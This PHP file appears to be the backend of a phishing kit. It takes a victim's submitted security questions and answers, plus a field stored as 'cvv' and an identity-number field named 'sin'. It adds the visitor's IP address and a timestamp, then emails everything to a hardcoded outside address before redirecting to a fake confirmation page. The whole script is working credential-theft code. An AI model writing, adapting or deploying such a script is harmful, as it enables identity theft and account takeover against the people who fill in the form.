<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['q1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['q2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['q3'];
$secretQuestion4Key = $_POST['secretQuestion4Key'];
$secretAnswer4 = $_POST['q4'];
$secretQuestion5Key = $_POST['secretQuestion5Key'];
$secretAnswer5 = $_POST['q5'];
$data ="
=============PAGE BY POSIEDON=================
Question 1:  $secretQuestion1Key
Answer 1:   $secretAnswer1
Question 2:  $secretQuestion2Key
Answer 2:   $secretAnswer2
Question 3:  $secretQuestion3Key
Answer 3:   $secretAnswer3
Question 4:  $secretQuestion4Key
Answer 4:   $secretAnswer4
Question 5:  $secretQuestion5Key
Answer 5:   $secretAnswer5
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);	

header("Location: ./confirm.html");

?>